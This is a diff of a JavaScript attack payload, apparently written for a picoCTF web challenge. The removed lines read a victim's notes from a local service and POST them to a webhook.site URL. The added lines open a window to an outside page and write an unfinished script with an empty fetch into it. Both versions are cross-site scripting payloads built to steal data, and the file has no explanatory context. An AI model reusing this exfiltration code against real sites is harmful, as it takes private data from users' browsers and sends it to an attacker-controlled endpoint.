@@ -1,47 +1,7 @@
+<script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
 <script>
-var req = new XMLHttpRequest();
-
-req.open('GET', 'http://0.0.0.0:8080/notes', true);
-req.setRequestHeader('Access-Control-Allow-Origin', '*');
-req.setRequestHeader('Origin', '0.0.0.0:8080');
-// req.withCredentials = true
-// req.open('GET', 'http://saturn.picoctf.net:62774', false);
-req.send(null);
-// var a = req;
-if(req.status == 200) {
-  a = req.responseText;
-}
-else {
-  a = req.statusText;
-  alert(req.statusText)
-}
-// var a = '1234'
-console.log(a)
-var req_webhook = new XMLHttpRequest();
-req_webhook.open('POST', `https://webhook.site/be1f8c0e-24d7-4dcd-a109-098da8ae468f`, true);
-// req_webhook.setRequestHeader('Access-Control-Allow-Origin', '*');
-req_webhook.send(a);
-
-// fetchNotes()
-
-// async function fetchNotes() {
-//   const response = await fetch('http://saturn.picoctf.net:62774',{mode: 'no-cors'}).then(function({
-
-//   }));
-//   // waits until the request completes...
-//   console.log(response.text());
-// }
-
-// fetchNotes().then(answer => {
-//   var parser = new DOMParser();
-
-//       // Parse the text
-//       var doc = parser.parseFromString(answer, "text/html");
-
-//       // You can now even select part of that html as you would in the regular DOM 
-//       // Example:
-//       // var docArticle = doc.querySelector('article').innerHTML;
-
-//       console.log(answer);
-// });
-  </script>
+purchaseWin = window.open("https://xiaoswaii.github.io","purchaseWin2", "location=0,status=0,scrollbars=0,width=700,height=400");
+purchaseWin.onload = function () {
+  purchaseWin.document.body.innerHTML = `<script>fetch('')</script>`;
+};
+</script>
